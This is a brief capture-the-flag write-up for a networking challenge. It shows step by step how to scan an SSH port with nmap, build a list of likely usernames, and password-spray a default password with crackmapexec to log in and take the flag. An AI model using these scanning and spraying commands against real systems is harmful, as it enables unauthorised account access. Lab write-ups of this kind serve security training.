 # Spray Lentil It Works!
 * **Event:** legumeCTF
 * **Problem Type:** Networking
 * **Point Value / Difficulty:** Easy(ish)
 * **(Optional) Tools Required / Used:** crackmapexec
 
 ## Steps

 #### Step 1
 using the command 'nmap -sC -sV -v -p 8722 ctf.isss.io' should reveal that ssh is open. looks like a good target

 #### Step 2
 Looking at userslist you can see a bunch of name. You can use 'cut -d "]" -f 2 userslist | awk '{print $1}' | tr . " "' to make it more presentable.

 #### Step 3
 From here it's a matter of seeing what username conventions they use. It happens to be first initial +lastname here. Alter your list to reflect this.
 
 #### Step 4 
 Now that we have a list of usernames we just need to see if any of them kept the default password. crackmapexec is a good tool for this. 'crackmapexec ssh ctf.isss.io --port 8722 -u copy -p Password123!' will do the trick.
 
 #### Step 5
 Now that we know who has access to ssh we can connect with 'ssh OPayne@0.0.0.0 -p 8722' and grab the flag!
